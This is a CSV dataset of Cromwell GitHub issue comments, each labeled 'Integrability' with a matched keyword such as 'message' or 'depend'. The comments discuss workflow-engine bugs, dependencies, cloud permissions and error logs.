quality_attribute,sentence,source,author,repo,version,id,keyword,matched_word,match_idx,wiki,url,total_similar,target_keywords,target_matched_words
Integrability,When I tried to reproduce this locally Cromwell completed the workflow successfully despite the fact that `find` had been invoked with invalid syntax and no placeholder `.file`s had been created in my empty directories. It looks like our wrapper script is not checking for failures at this point.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4536#issuecomment-460417893:238,wrap,wrapper,238,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4536#issuecomment-460417893,1,['wrap'],['wrapper']
Integrability,"When an actor sends a message to another actor and that actor isn't expecting to handle that type of message, akka has its own way of logging the error. Some well intentioned Cromwellians often partake in a pattern where they explicitly catch these and log the error. It's unnecessary and adds to LOC. Really this is tech debt, i'll relabel",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1808#issuecomment-328927526:22,message,message,22,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1808#issuecomment-328927526,2,['message'],['message']
Integrability,"When using the `PAPIv2` backend, I have noticed that the same previous set of roles is not sufficient to be able to run the pipelines. Instead, after a long and tedious amount of work, I have figured that the following set of roles:; 1) [Cloud Life Sciences](https://cloud.google.com/life-sciences/docs/concepts/access-control#roles) Workflows Runner (`lifesciences.workflowsRunner`); 2) [Service Account User](https://cloud.google.com/iam/docs/service-accounts#user-role) (`iam.serviceAccountUser`); 3) [Firebase Develop](https://firebase.google.com/docs/projects/iam/roles-predefined-category#analytics_roles) Admin (`firebase.developAdmin`). are sufficient to run a pipelne on Google Cloud through a service account. I suppose that `lifesciences.workflowsRunner` is a replacement for `genomics.pipelinesRunner`, but I have no idea why `firebase.developAdmin` is required (or what else should be required in its place). To save my life, I could not find this information anywhere in the Cromwell documentation nor evince it from the Cromwell error messages themselves (nor understand what the `firebase.developAdmin` roles actually allows).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4304#issuecomment-680282059:1050,message,messages,1050,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4304#issuecomment-680282059,1,['message'],['messages']
Integrability,"Where did you look? The file in the error message is the output of a task. On Tue, Aug 30, 2016 at 9:37 AM, Jeff Gentry notifications@github.com; wrote:. > That error is a failure of jes to initialize a vm for you in the first; > place. There are no logs to write beyond what's in there. I just took a; > quick glance but it looks like you're specifying a file which doesn't exist; > ; > —; > You are receiving this because you authored the thread.; > Reply to this email directly, view it on GitHub; > https://github.com/broadinstitute/cromwell/issues/1357#issuecomment-243440920,; > or mute the thread; > https://github.com/notifications/unsubscribe-auth/ACDXk0bYjGuwmLKdzJkzsIk8YUxr-Ee8ks5qlDIygaJpZM4JwiCG; > . ## . Lee Lichtenstein; Broad Institute; 75 Ames Street, Room 7003EB; Cambridge, MA 02142; 617 714 8632",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1357#issuecomment-243442366:42,message,message,42,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1357#issuecomment-243442366,1,['message'],['message']
Integrability,"While exploring the idea of using a `monitoring_image` for this, I noticed it injects more or less the metadata I'd want into the monitoring container via environment variables already: . https://github.com/broadinstitute/cromwell/blob/adb8d2ad87cba307e5b1eccd1a3e21857cc9b81c/supportedBackends/google/pipelines/v2beta/src/main/scala/cromwell/backend/google/pipelines/v2beta/api/MonitoringAction.scala#L36. https://github.com/broadinstitute/cromwell/blob/adb8d2ad87cba307e5b1eccd1a3e21857cc9b81c/supportedBackends/google/pipelines/common/src/main/scala/cromwell/backend/google/pipelines/common/monitoring/Env.scala#L18. Is there a reason this could not also be injected into UserActions, and would you accept a PR that does so? (As a side note, it seems the monitoring image could likely accomplish what we want as well, but using one on Terra, or setting any custom workflow options is not allowed as far as I know).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7137#issuecomment-1590042851:78,inject,injects,78,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7137#issuecomment-1590042851,2,['inject'],"['injected', 'injects']"
Integrability,"While this is investigated, you should be able to work around this by moving the constant string outside the `${}`s, eg ; ```; python $(which encode_trim_adapter.py) \; ${write_tsv(fastqs)} \; --adapters ${write_tsv(adapters)} \; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3032#issuecomment-350283048:195,adapter,adapters,195,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3032#issuecomment-350283048,2,['adapter'],['adapters']
Integrability,Who is responsible for converting the current messages into appropriate MetadataTypes?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/897#issuecomment-221956021:46,message,messages,46,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/897#issuecomment-221956021,1,['message'],['messages']
Integrability,Will push a patch updating the lenthall and wdl4s dependencies-- once those PRs get one more thumb.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1379#issuecomment-245486795:50,depend,dependencies,50,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1379#issuecomment-245486795,1,['depend'],['dependencies']
Integrability,"Will update wdl4s to a published version once https://github.com/broadinstitute/wdl4s/pull/38 is reviewed, merged, and auto-published. https://github.com/broadinstitute/lenthall/pull/22 needs to be reviewed also, but the artifact update isn't required as lenthall's cats dependencies are listed as Provided.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1589#issuecomment-254399325:271,depend,dependencies,271,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1589#issuecomment-254399325,1,['depend'],['dependencies']
Integrability,"With udocker running in proot vs Singularity running in chroot, some HPC performance/IB/GPUcapability issues might occur in this route.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2177#issuecomment-358345068:129,rout,route,129,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2177#issuecomment-358345068,1,['rout'],['route']
Integrability,"Yeah I'm not sure I understand how this is the problem, it looks like as soon as we get an `IoFailure` we change state and get to `Failing`, where we just wait for the rest of the IO responses but don't send anything else to the EJEA. Since it looks like we create one of this per cache hit I don't see how this actor can keep sending ""JobFailed"" messages multiple times",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4085#issuecomment-420355576:347,message,messages,347,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4085#issuecomment-420355576,1,['message'],['messages']
Integrability,Yeah so it looks like the exact same thing happened. It can't delocalize the output file because it was never created. In the JES logs the same message as before happened again:. ```; 2017/03/20 16:44:51 I: Docker file /cromwell_root/gs:/bg_tag_team/Tumor_Only_Resources/gatk-protected-1.0.0.0-alpha1.2.4.jar maps to host location /mnt/local-disk/gs:/bg_tag_team/Tumor_Only_Resources/gatk-protected-1.0.0.0-alpha1.2.4.jar.; 2017/03/20 16:44:51 I: Copying gs://bg_tag_team/Tumor_Only_Resources/gatk-protected-1.0.0.0-alpha1.2.4.jar to /mnt/local-disk/gs:/bg_tag_team/Tumor_Only_Resources/gatk-protected-1.0.0.0-alpha1.2.4.jar; 2017/03/20 16:44:51 I: Running command: sudo gsutil -q -m cp gs://bg_tag_team/Tumor_Only_Resources/gatk-protected-1.0.0.0-alpha1.2.4.jar /mnt/local-disk/gs:/bg_tag_team/Tumor_Only_Resources/gatk-protected-1.0.0.0-alpha1.2.4.jar; ```,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2078#issuecomment-287830506:144,message,message,144,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2078#issuecomment-287830506,1,['message'],['message']
Integrability,"Yeah that's good for now, feel free to change the implementation behind the interface if you need to.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/548#issuecomment-196535579:76,interface,interface,76,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/548#issuecomment-196535579,1,['interface'],['interface']
Integrability,"Yeah, it's all of them - because all of them check the cache hit UUID and will fail if it's not the expected value. I'll take a look and see if there's a good way to prevent retries for these test formats in general. I agree that depending on people to add the flag to each test file is not great, but it seems nice for debugging - if you're wondering why a test didn't retry, this is the first place you'd look.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6657#issuecomment-1022241403:230,depend,depending,230,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6657#issuecomment-1022241403,1,['depend'],['depending']
Integrability,"Yeah, it's definitely easier to get rolling. I found pretty quickly in Centaur that I was rolling my own extensions to Ficus (typeclasses IIRC?) which seemed to defeat the point. I switched to configs as it gives you more stuff out of the box. The monad returns I've both enjoyed and shaken my fist at depending on the situation. I liked these two better than any of the rest I saw. . I didn't look at the PR but if you didn't need to do any extensions I suppose it doesn't matter for now. . Edit: To be clear, ""I suppose it doesn't matter"" means ""carry on"", ficus was definitely easier to use until I found myself making custom typeclasses and wondering if i should stick them in Lenthall.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1554#issuecomment-252431037:302,depend,depending,302,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1554#issuecomment-252431037,1,['depend'],['depending']
Integrability,"Yes I think it's the similar kind of problem that makes the ""filepassing.wdl"" fail. There's some kind of recursive dependency between coercion/evaluation that we should look into at some point.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/283#issuecomment-155481705:115,depend,dependency,115,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/283#issuecomment-155481705,1,['depend'],['dependency']
Integrability,"Yes it's this one https://github.com/broadinstitute/cromwell/commit/50cf0bd4f4f89bac5a82fe888166b3203bd5e1b7. The way evaluation is done makes nested evaluation hard to handle. I'm wondering if some kind of ""multi-pass evaluation"" wouldn't make things easier. ; The problem is that when evaluating something like `read_string(""${file_name}"")`,; the evaluation of `""${file_name}""` gives you a string which is most likely the name of a local file in the call directory, something like `out`. Now it's impossible just with this to know if it's supposed to be a gcs path, or a local path, which makes it difficult to know which ""IoInterface"" to use to do the `read_string`.; I ended up overwriting `fileContentsToString` in the JesEngineFunctions to append the gcs path of the call bucket before the file name, and also not providing JesBackend workflows with a `SharedFilesystemIoInterface`, because `out` is a valid Unix path so it would try to use this interface on paths that are actually ""relative gcs paths"".",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/305#issuecomment-162639145:952,interface,interface,952,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/305#issuecomment-162639145,1,['interface'],['interface']
Integrability,"Yes maybe I should have mentioned it when making the PR but this wan't really meant to be merged as is. I was playing around with the nio interfaces and this ticket seemed like a good candidate to try and use a GCS implementation of those interfaces which is why it ends up being here.; However IMO this would require at least a small tech talk to discuss if it's even worth going this way, and if yes there are a few technical implementation details about the paths for example that could be interesting to discuss too.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/351#issuecomment-169323204:138,interface,interfaces,138,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/351#issuecomment-169323204,2,['interface'],['interfaces']
Integrability,"Yes, I also think dead letters message is no issue. . root@d0ef87b8b6b8:/cromwell-executions/PreProcessingForVariantDiscovery_GATK4/7ffcdf28-2324-4c07-8e87-926a150334d9/call-SamToFastqAndBwaMem/shard-0/execution# **cat stderr**; > Picked up _JAVA_OPTIONS: -Djava.io.tmpdir=/cromwell-executions/PreProcessingForVariantDiscovery_GATK4/7ffcdf28-2324-4c07-8e87-926a150334d9/call-SamToFastqAndBwaMem/shard-0/execution/tmp.rmIqEe; > ERROR StatusLogger No log4j2 configuration file found. Using default configuration: logging only errors to the console.; > [M::bwa_idx_load_from_disk] read 0 ALT contigs; > [W::main_mem] when '-p' is in use, the second query file is ignored.; > . stdout is 0 byte. I'm running on local machine. ; Just I used 2 bam file only.; $ /BiO/Project/brandon-genome-analysis/data/NA12878_24RG_small.txt; /BiO/Project/brandon-genome-analysis/data/HJYFJ.4.NA12878.downsampled.query.sorted.unmapped.bam; /BiO/Project/brandon-genome-analysis/data/HJYFJ.5.NA12878.downsampled.query.sorted.unmapped.bam. I found some issue in stderr file. > Picked up _JAVA_OPTIONS: -Djava.io.tmpdir=/cromwell-executions/PreProcessingForVariantDiscovery_GATK4/7ffcdf28-2324-4c07-8e87-926a150334d9/call-SamToFastqAndBwaMem/shard-0/execution/tmp.rmIqEe; > ERROR StatusLogger No log4j2 configuration file found. Using default configuration: logging only errors to the console. Could you suggest any comment for this ?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3269#issuecomment-367256315:31,message,message,31,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3269#issuecomment-367256315,1,['message'],['message']
Integrability,"Yes. How it gets handled depends on what version you're using. Up until recently (I believe 22) would see the rate limit notification and just retry it. The latest version changes how we poll JES in that it is sending bulk requests over. The rate at which that happens is designed to stay below the rate limits, although if something were to still happen it'd just go back to the previous behavior and retry it.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1663#issuecomment-259755456:25,depend,depends,25,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1663#issuecomment-259755456,1,['depend'],['depends']
Integrability,"You have the dependencies in `Call#prerequisiteCallNames`, so you certainly _could_ perform a Topological sort. But TBH a backend having a requirement for a topologically ordered list of calls seems kind of sketchy.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1214#issuecomment-236149002:13,depend,dependencies,13,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1214#issuecomment-236149002,1,['depend'],['dependencies']
Integrability,"You mentioned the dependency of job store simpletons on job store entries, is that still a complication here?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2085#issuecomment-288824517:18,depend,dependency,18,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2085#issuecomment-288824517,1,['depend'],['dependency']
Integrability,"Your latest commit _might_ be failing because it's logging to stdout while conformance tests only allow logging to stderr. There are lots of `Extra data: line 1 column 3 - line 18 column 1 (char 2 - 1091)` in the travis logs for Local conformance tests. Someday one of us will get the hang of logback and we can just ""easily"" [switch from stdout to stderr](https://stackoverflow.com/questions/25935326/how-can-i-configure-logback-conf-to-send-all-messages-to-stderr). For now I don't have any quick fixes for logging w/ our existing slf4j framework. `Console.err.println()` would work, but isn't pretty either.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3627#issuecomment-389337148:447,message,messages-to-stderr,447,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3627#issuecomment-389337148,1,['message'],['messages-to-stderr']
Integrability,"[2018-11-04T19:02:19.373750Z] [2a8fea138cb7] [72_1] [WorkflowRunner] [ERROR] Traceback (most recent call last):; [2018-11-04T19:02:19.373786Z] [2a8fea138cb7] [72_1] [WorkflowRunner] [ERROR] File ""/usr/local/share/bcbio-nextgen/anaconda/share/manta-1.4.0-1/lib/python/pyflow/pyflow.py"", line 1069, in run; [2018-11-04T19:02:19.373812Z] [2a8fea138cb7] [72_1] [WorkflowRunner] [ERROR] (retval, retmsg) = self._run(); [2018-11-04T19:02:19.373833Z] [2a8fea138cb7] [72_1] [WorkflowRunner] [ERROR] File ""/usr/local/share/bcbio-nextgen/anaconda/share/manta-1.4.0-1/lib/python/pyflow/pyflow.py"", line 1121, in _run; [2018-11-04T19:02:19.373871Z] [2a8fea138cb7] [72_1] [WorkflowRunner] [ERROR] self.workflow.workflow(); [2018-11-04T19:02:19.373894Z] [2a8fea138cb7] [72_1] [WorkflowRunner] [ERROR] File ""/usr/local/share/bcbio-nextgen/anaconda/share/manta-1.4.0-1/lib/python/mantaWorkflow.py"", line 895, in workflow; [2018-11-04T19:02:19.373930Z] [2a8fea138cb7] [72_1] [WorkflowRunner] [ERROR] graphTasks = runLocusGraph(self,dependencies=graphTaskDependencies); [2018-11-04T19:02:19.373954Z] [2a8fea138cb7] [72_1] [WorkflowRunner] [ERROR] File ""/usr/local/share/bcbio-nextgen/anaconda/share/manta-1.4.0-1/lib/python/mantaWorkflow.py"", line 296, in runLocusGraph; [2018-11-04T19:02:19.373978Z] [2a8fea138cb7] [72_1] [WorkflowRunner] [ERROR] mergeTask = self.addTask(preJoin(taskPrefix,""mergeLocusGraph""),mergeCmd,dependencies=tmpGraphFileListTask,memMb=self.params.mergeMemMb); [2018-11-04T19:02:19.374002Z] [2a8fea138cb7] [72_1] [WorkflowRunner] [ERROR] File ""/usr/local/share/bcbio-nextgen/anaconda/share/manta-1.4.0-1/lib/python/pyflow/pyflow.py"", line 3689, in addTask; [2018-11-04T19:02:19.374023Z] [2a8fea138cb7] [72_1] [WorkflowRunner] [ERROR] raise Exception(""Task memory requirement exceeds full available resources""); [2018-11-04T19:02:19.374046Z] [2a8fea138cb7] [72_1] [WorkflowRunner] [ERROR] Exception: Task memory requirement exceeds full available resources; ```. The cwl [requests 4GB](https://g",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3724#issuecomment-435937856:1467,depend,dependencies,1467,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3724#issuecomment-435937856,1,['depend'],['dependencies']
Integrability,"] JesAsyncBackendJobExecutionActor [a3dd8163case_gatk_acnv_workflow.CNLoHAndSplitsCaller:3:1]: JesAsyncBackendJobExecutionActor [a3dd8163:case_gatk_acnv_workflow.CNLoHAndSplitsCaller:3:1] Status change from - to Initializing; [2016-10-28 14:38:43,07] [info] JesAsyncBackendJobExecutionActor [a3dd8163case_gatk_acnv_workflow.PlotACNVResults:3:1]: JesAsyncBackendJobExecutionActor [a3dd8163:case_gatk_acnv_workflow.PlotACNVResults:3:1] Status change from - to Initializing; [2016-10-28 14:38:43,07] [warn] 1 failures fetching JES statuses: {""domain"":""global"",""message"":""Deadline expired before operation could complete."",""reason"":""backendError""}; [2016-10-28 14:38:43,07] [warn] JesAsyncBackendJobExecutionActor [a3dd8163case_gatk_acnv_workflow.AllelicCNV:4:1]: Caught exception, retrying:; java.io.IOException: Google request failed: {; ""code"" : 504,; ""errors"" : [ {; ""domain"" : ""global"",; ""message"" : ""Deadline expired before operation could complete."",; ""reason"" : ""backendError""; } ],; ""message"" : ""Deadline expired before operation could complete."",; ""status"" : ""DEADLINE_EXCEEDED""; }; at cromwell.backend.impl.jes.statuspolling.JesPollingActorClient$$anonfun$pollingActorClientReceive$1.applyOrElse(JesPollingActorClient.scala:30); at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:170); at akka.actor.Actor$class.aroundReceive(Actor.scala:484); at cromwell.backend.impl.jes.JesAsyncBackendJobExecutionActor.aroundReceive(JesAsyncBackendJobExecutionActor.scala:82); at akka.actor.ActorCell.receiveMessage(ActorCell.scala:526); at akka.actor.ActorCell.invoke(ActorCell.scala:495); at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:257); at akka.dispatch.Mailbox.run(Mailbox.scala:224); at akka.dispatch.Mailbox.exec(Mailbox.scala:234); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scal",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1631#issuecomment-256938948:14291,message,message,14291,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1631#issuecomment-256938948,1,['message'],['message']
Integrability,"^^ that commit message is a lie, I accidentally accepted the default in IntelliJ. It's just about all of your change requests that hadn't spawned a question/discussion",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3601#issuecomment-387500001:15,message,message,15,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3601#issuecomment-387500001,1,['message'],['message']
Integrability,_Big picture:_ This PR introduces a `CallDescriptor` wrapper around some other stuff. How do you envision this to be of use in PBE? Do you see this as turning into a `TaskDescriptor`? Does it reduce any effort later on?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/502#issuecomment-191933148:53,wrap,wrapper,53,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/502#issuecomment-191933148,1,['wrap'],['wrapper']
Integrability,`SprayDockerRegistryApiClientSpec` is finicky. Should probably me marked as an `CromwellSpec.IntegrationTest`. It was already using `org.scalatest.concurrent.IntegrationPatience`.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/348#issuecomment-168885841:93,Integrat,IntegrationTest,93,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/348#issuecomment-168885841,2,['Integrat'],"['IntegrationPatience', 'IntegrationTest']"
Integrability,"```; [ERROR] [05/01/2017 21:06:41.921] [cromwell-system-akka.dispatchers.engine-dispatcher-106] [akka://cromwell-system/user/cromwell-service/WorkflowManagerActor] WorkflowManagerActor Workflow; 67fdb82c-72bb-4d33-a74b-441a8db2a780 failed (during ExecutingWorkflowState): Task m2.Mutect2.M2:108:1 failed. JES error code 10. Message: 15: Gsutil failed: failed to upload logs for ""gs:/; /broad-dsde-methods/lichtens/cromwell-executions-test-dl-oxoq-full/full_dl_ob_training_with_m2/67fdb82c-72bb-4d33-a74b-441a8db2a780/call-m2_nt/shard-37/Mutect2/71720e5e-1769-46e7-a2b8-98d19; ec38f93/call-M2/shard-108/"": cp failed: gsutil -h Content-type:text/plain -q -m cp /var/log/google-genomics/*.log gs://broad-dsde-methods/lichtens/cromwell-executions-test-dl-oxoq-full/full; _dl_ob_training_with_m2/67fdb82c-72bb-4d33-a74b-441a8db2a780/call-m2_nt/shard-37/Mutect2/71720e5e-1769-46e7-a2b8-98d19ec38f93/call-M2/shard-108/, command failed: Traceback (most recent call; last):; File ""/usr/local/share/google/google-cloud-sdk/bin/bootstrapping/gsutil.py"", line 75, in <module>; main(); File ""/usr/local/share/google/google-cloud-sdk/bin/bootstrapping/gsutil.py"", line 22, in main; project, account = bootstrapping.GetActiveProjectAndAccount(); File ""/usr/local/share/google/google-cloud-sdk/bin/bootstrapping/bootstrapping.py"", line 205, in GetActiveProjectAndAccount; project_name = properties.VALUES.core.project.Get(validate=False); File ""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/properties.py"", line 1221, in Get; required); File ""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/properties.py"", line 1501, in _GetProperty; value = _GetPropertyWithoutDefault(prop, properties_file); File ""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/properties.py"", line 1539, in _GetPropertyWithoutDefault; value = callback(); File ""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/properties.py"", line 693, in _GetGCEProject; return c_gce.Metadata(",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2228#issuecomment-298751846:324,Message,Message,324,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2228#issuecomment-298751846,1,['Message'],['Message']
Integrability,`sbt.ResolveException: unresolved dependency: org.broadinstitute#wdl4s_2.11;0.4: not found` - just because it's waiting for the other PR to be merged?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/510#issuecomment-193329275:34,depend,dependency,34,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/510#issuecomment-193329275,1,['depend'],['dependency']
Integrability,adFully(InputRecord.java:465) ~[na:1.8.0_72]; 905152- at sun.security.ssl.InputRecord.read(InputRecord.java:503) ~[na:1.8.0_72]; 905153- at sun.security.ssl.SSLSocketImpl.readRecord(SSLSocketImpl.java:973) ~[na:1.8.0_72]; 905154- at sun.security.ssl.SSLSocketImpl.readDataRecord(SSLSocketImpl.java:930) ~[na:1.8.0_72]; 905155- at sun.security.ssl.AppInputStream.read(AppInputStream.java:105) ~[na:1.8.0_72]; 905156- at java.io.BufferedInputStream.fill(BufferedInputStream.java:246) ~[na:1.8.0_72]; 905157- at java.io.BufferedInputStream.read1(BufferedInputStream.java:286) ~[na:1.8.0_72]; 905158- at java.io.BufferedInputStream.read(BufferedInputStream.java:345) ~[na:1.8.0_72]; 905159- at sun.net.www.http.HttpClient.parseHTTPHeader(HttpClient.java:704) ~[na:1.8.0_72]; 905160- at sun.net.www.http.HttpClient.parseHTTP(HttpClient.java:647) ~[na:1.8.0_72]; 905161- at sun.net.www.protocol.http.HttpURLConnection.getInputStream0(HttpURLConnection.java:1536) ~[na:1.8.0_72]; 905162- at sun.net.www.protocol.http.HttpURLConnection.getInputStream(HttpURLConnection.java:1441) ~[na:1.8.0_72]; 905163- at java.net.HttpURLConnection.getResponseCode(HttpURLConnection.java:480) ~[na:1.8.0_72]; 905164- at sun.net.www.protocol.https.HttpsURLConnectionImpl.getResponseCode(HttpsURLConnectionImpl.java:338) ~[na:1.8.0_72]; 905165- at com.google.api.client.http.javanet.NetHttpResponse.<init>(NetHttpResponse.java:37) ~[cromwell.jar:0.19]; 905166- at com.google.api.client.http.javanet.NetHttpRequest.execute(NetHttpRequest.java:94) ~[cromwell.jar:0.19]; 905167- at com.google.api.client.http.HttpRequest.execute(HttpRequest.java:972) ~[cromwell.jar:0.19]; 905168- at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.java:419) ~[cromwell.jar:0.19]; 905169- at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.java:352) ~[cromwell.jar:0.19]; 905170- at com.google.api.client.googleapi,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/738#issuecomment-214521102:1460,protocol,protocol,1460,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/738#issuecomment-214521102,1,['protocol'],['protocol']
Integrability,adsl.settings.ParserSettings$.default(ParserSettings.scala:119); 	at cromwell.webservice.CromwellApiService.$anonfun$workflowRoutes$68(CromwellApiService.scala:233); 	at akka.http.scaladsl.server.Directive$.$anonfun$addByNameNullaryApply$2(Directive.scala:134); 	at akka.http.scaladsl.server.directives.BasicDirectives.$anonfun$mapRouteResult$2(BasicDirectives.scala:66); 	at akka.http.scaladsl.server.directives.BasicDirectives.$anonfun$textract$2(BasicDirectives.scala:159); 	at akka.http.scaladsl.server.directives.BasicDirectives.$anonfun$mapRouteResult$2(BasicDirectives.scala:66); 	at akka.http.scaladsl.server.directives.BasicDirectives.$anonfun$textract$2(BasicDirectives.scala:159); 	at akka.http.scaladsl.server.directives.BasicDirectives.$anonfun$mapRequestContext$2(BasicDirectives.scala:43); 	at akka.http.scaladsl.server.directives.BasicDirectives.$anonfun$textract$2(BasicDirectives.scala:159); 	at akka.http.scaladsl.server.RouteConcatenation$RouteWithConcatenation.$anonfun$$tilde$2(RouteConcatenation.scala:47); 	at akka.http.scaladsl.util.FastFuture$.strictTransform$1(FastFuture.scala:41); 	at akka.http.scaladsl.util.FastFuture$.transformWith$extension1(FastFuture.scala:45); 	at akka.http.scaladsl.util.FastFuture$.flatMap$extension(FastFuture.scala:26); 	at akka.http.scaladsl.server.RouteConcatenation$RouteWithConcatenation.$anonfun$$tilde$1(RouteConcatenation.scala:44); 	at akka.http.scaladsl.server.RouteConcatenation$RouteWithConcatenation.$anonfun$$tilde$1(RouteConcatenation.scala:44); 	at akka.http.scaladsl.server.RouteConcatenation$RouteWithConcatenation.$anonfun$$tilde$2(RouteConcatenation.scala:47); 	at akka.http.scaladsl.util.FastFuture$.strictTransform$1(FastFuture.scala:41); 	at akka.http.scaladsl.util.FastFuture$.transformWith$extension1(FastFuture.scala:45); 	at akka.http.scaladsl.util.FastFuture$.flatMap$extension(FastFuture.scala:26); 	at akka.http.scaladsl.server.RouteConcatenation$RouteWithConcatenation.$anonfun$$tilde$1(RouteConcatenation.scala:44,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4676#issuecomment-467133187:1731,Rout,RouteConcatenation,1731,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4676#issuecomment-467133187,1,['Rout'],['RouteConcatenation']
